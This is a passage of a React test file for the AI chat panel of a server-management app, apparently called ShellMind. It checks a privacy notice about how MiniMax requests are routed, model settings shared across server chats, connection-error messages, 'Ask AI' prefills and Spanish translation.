        expect(within(issueCard()).getByText('Recent issues')).not.toBeVisible();

        fireEvent.click(within(issueCard()).getByRole('button', { name: 'Fix it' }));
        expect(toggle).toHaveAttribute('aria-expanded', 'true');
        const suggestion = await screen.findByText('Suggested command');
        expect(suggestion).toBeVisible();
        // The suggestion comes before the list of older issues.
        expect(suggestion.compareDocumentPosition(within(issueCard()).getByText('Recent issues')) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    });

    it('caps the composer height to a share of the panel', () => {
        renderChat();
        expect(composer().style.maxHeight).toBe('220px');
    });

    it('discloses where MiniMax traffic goes until acknowledged', async () => {
        renderChat();
        const note = await screen.findByRole('note');
        expect(note).toHaveTextContent('MiniMax requests go through the ShellMind proxy, as described in the legal notice.');
        expect(note).toHaveTextContent(/conversation history, recent terminal and command output, the evidence you attach \(service status, logs, the status snapshot…\), and the server's name/);
        expect(note).not.toHaveTextContent('ai-proxy.luisbh.com');
        expect(screen.getByRole('link', { name: 'legal notice' })).toHaveAttribute('href', 'https://shellmind.app/legal.html#ai-data');
        fireEvent.click(screen.getByRole('button', { name: 'Got it' }));
        expect(screen.queryByText(/through the ShellMind proxy/)).toBeNull();
        expect(window.localStorage.getItem('shellmind.chat.minimaxNotice')).toBe('v2:proxy:ai-proxy.luisbh.com');
    });

    it('shows the notice again when it names new data, even if the earlier one was acknowledged', async () => {
        window.localStorage.setItem('shellmind.chat.minimaxNotice', 'proxy:ai-proxy.luisbh.com');
        renderChat();
        expect(await screen.findByRole('note')).toHaveTextContent('the evidence you attach');
    });

    it('describes the direct MiniMax route when the user has a key, even if the proxy notice was acknowledged', async () => {
        window.localStorage.setItem('shellmind.chat.minimaxNotice', 'v2:proxy:ai-proxy.luisbh.com');
        minimaxRoute = 'direct';
        renderChat();
        const notice = await screen.findByRole('note');
        expect(notice).toHaveTextContent('MiniMax models answer directly from MiniMax with your API key.');
        expect(notice).toHaveTextContent('If MiniMax rejects your key, requests go through the ShellMind proxy instead, as described in the legal notice.');
        expect(notice).not.toHaveTextContent(/luisbh|api\.minimax\.io/);
        fireEvent.click(screen.getByRole('button', { name: 'Got it' }));
        expect(window.localStorage.getItem('shellmind.chat.minimaxNotice')).toBe('v2:direct:api.minimax.io');
    });

    it('switches the disclosure to the direct route as soon as a MiniMax key is saved in Settings', async () => {
        renderChat();
        expect(await screen.findByRole('note')).toHaveTextContent('MiniMax requests go through the ShellMind proxy');
        minimaxRoute = 'direct';
        act(() => useAppStore.getState().aiConfigChanged());
        expect(await screen.findByText(/directly from MiniMax with your API key/)).toBeInTheDocument();
    });

    // Every open server keeps its chat mounted: app-wide settings stay one.
    it('shares the model, the MiniMax notice and its route reads between the chats of the open servers', async () => {
        const other: WorkspaceServer = { id: 2, name: 'db-1', ip: '10.0.0.6', type: 'linux' };
        render(
            <ToastProvider>
                <ConfirmProvider>
                    <div data-testid="chat-1"><ChatPanel activeServer={SERVER} connectionState="connected" /></div>
                    <div data-testid="chat-2"><ChatPanel activeServer={other} connectionState="connected" /></div>
                </ConfirmProvider>
            </ToastProvider>
        );
        const first = within(screen.getByTestId('chat-1'));
        const second = within(screen.getByTestId('chat-2'));
        const routeReads = () => calls.filter((call) => call.url.endsWith('/api/config/status')).length;

        await waitFor(() => expect(screen.getAllByRole('note')).toHaveLength(2));
        expect(routeReads()).toBe(1);
        act(() => { window.dispatchEvent(new Event('focus')); });
        await waitFor(() => expect(routeReads()).toBe(2));
        await act(async () => undefined);
        expect(routeReads()).toBe(2);

        fireEvent.click(first.getByRole('button', { name: 'Got it' }));
        expect(screen.queryAllByRole('note')).toHaveLength(0);

        fireEvent.click(first.getByRole('combobox'));
        fireEvent.click(screen.getByRole('option', { name: 'MiniMax M3.1 Flash' }));
        expect(second.getByRole('combobox')).toHaveTextContent('MiniMax M3.1 Flash');
        await waitFor(() => expect(calls.filter((call) => call.method === 'POST' && call.url.endsWith('/api/config/model'))).toHaveLength(1));

        fireEvent.change(second.getByRole('textbox', { name: 'Message for the AI assistant' }), { target: { value: 'disk usage?' } });
        fireEvent.keyDown(second.getByRole('textbox', { name: 'Message for the AI assistant' }), { key: 'Enter' });
        await waitFor(() => expect(chatCalls()).toHaveLength(1));
        expect((chatCalls()[0].body as ChatRequestBody).model).toBe('MiniMax-M3.1-Flash');
    });

    it('points to the issue card after a failed connection only when one is shown', () => {
        const view = renderChat({ connectionState: 'error' });
        expect(screen.getByText("Couldn't connect to web-1. I can still help: ask me anything.")).toBeInTheDocument();
        view.unmount();
        renderChat({ connectionState: 'error', terminalIssues: [{ id: 'i1', type: 'error', message: 'Permission denied (publickey)', timestamp: 1 }] });
        expect(screen.getByText("Couldn't connect to web-1. I can still help: check the issue below or ask me anything.")).toBeInTheDocument();
    });

    it('fills the composer from a terminal "Ask AI" request', async () => {
        renderChat();
        act(() => useAppStore.getState().requestChat({ serverId: 1, kind: 'prompt', prompt: 'Analyze the output' }));
        await waitFor(() => expect(composer()).toHaveValue('Analyze the output'));
        expect(useAppStore.getState().chatRequest).toBeNull();
    });

    it('puts the question of an "Ask AI" button in the composer, without asking for a fix or sending anything', async () => {
        renderChat({ terminalIssues: [{ id: 'i1', type: 'error', message: 'Permission denied', timestamp: 1 }] });
        act(() => useAppStore.getState().requestChat({
            serverId: 1, kind: 'context', attachment: { kind: 'container', container: 'web' }, prompt: 'What is wrong with web?'
        }));
        await waitFor(() => expect(composer()).toHaveValue('What is wrong with web?'));
        expect(useAppStore.getState().chatRequest).toBeNull();
        expect(chatCalls()).toHaveLength(0);
        expect(calls.filter((call) => call.url.endsWith('/api/chat/evidence'))).toHaveLength(1);
    });

    it('translates the panel', async () => {
        renderChat();
        act(() => setLanguage('es'));
        expect(await screen.findByText('Conectado a web-1. Listo para ayudarte.')).toBeInTheDocument();
        expect(screen.getByRole('textbox', { name: 'Mensaje para el asistente de IA' })).toBeInTheDocument();
    });
});
